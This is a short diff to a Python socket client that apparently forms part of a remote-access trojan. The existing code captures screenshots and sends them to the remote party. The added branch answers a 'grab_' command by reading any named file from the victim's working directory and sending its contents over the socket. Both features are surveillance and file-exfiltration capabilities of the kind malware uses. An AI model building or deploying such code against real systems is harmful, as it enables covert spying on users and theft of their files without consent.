@@ -80,6 +80,17 @@ def main():
                   im = ImageGrab.grab()
                   send_data(s, im)
                   'continue to send bytes up to that size'
+              elif "grab" in message:
+                  file_name = message.replace("grab_", "")
+                  print(file_name)
+                  #check directory
+                  cur_dir = os.getcwd()
+                  location = cur_dir + "/" + file_name
+                  print(location)
+                  with open(file_name, "rb") as f:
+                      file = f.read()
+                  print(file)
+                  send_data(s, file)
               elif data == '':
                   s.close()
                   sys.exit()
